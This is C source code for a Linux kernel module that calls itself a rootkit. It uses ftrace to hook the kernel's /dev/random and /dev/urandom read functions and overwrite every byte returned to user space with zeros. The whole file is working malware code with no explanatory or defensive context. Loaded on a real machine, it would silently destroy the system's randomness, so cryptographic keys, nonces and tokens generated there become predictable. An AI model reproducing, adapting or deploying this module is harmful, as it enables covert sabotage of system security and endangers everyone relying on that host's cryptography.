#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nobody Special");
MODULE_DESCRIPTION("Interferes with char devices");
MODULE_VERSION("0.0.1");

static asmlinkage ssize_t (*orig_random_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
static asmlinkage ssize_t (*orig_urandom_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);

static asmlinkage ssize_t hook_random_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
{
    int bytes_read, i;
    long error;
    char *kbuf = NULL;

    bytes_read = orig_random_read(file, buf, nbytes, ppos);
    printk(KERN_DEBUG "rootkit: intercepted read to /dev/random: %d bytes\n", bytes_read);

    kbuf = kzalloc(bytes_read, GFP_KERNEL);
    error = copy_from_user(kbuf, buf, bytes_read);

    if (error)
    {
        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into kbuf\n", error);
        kfree(kbuf);
        return bytes_read;
    }

    for ( i = 0; i < bytes_read; i++ )
        kbuf[i] = 0x00;

    error = copy_to_user(buf, kbuf, bytes_read);
    if (error)
        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into buf\n", error);

    kfree(kbuf);
    return bytes_read;
}

static asmlinkage ssize_t hook_urandom_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
{
    int bytes_read, i;
    long error;
    char *kbuf = NULL;

    bytes_read = orig_urandom_read(file, buf, nbytes, ppos);
    printk(KERN_DEBUG "rootkit: intercepted read to /dev/urandom: %d bytes\n", bytes_read);

    kbuf = kzalloc(bytes_read, GFP_KERNEL);
    error = copy_from_user(kbuf, buf, bytes_read);

    if (error)
    {
        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into kbuf\n", error);
        kfree(kbuf);
        return bytes_read;
    }

    for ( i = 0; i < bytes_read; i++ )
        kbuf[i] = 0x00;

    error = copy_to_user(buf, kbuf, bytes_read);
    if (error)
        printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into buf\n", error);

    kfree(kbuf);
    return bytes_read;
}

static struct ftrace_hook hooks[] = {
    HOOK("random_read", hook_random_read, &orig_random_read),
    HOOK("urandom_read", hook_urandom_read, &orig_urandom_read),
};

static int __init rootkit_init(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err)
        return err;

    printk(KERN_INFO "rootkit: Loaded");

    return 0;
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
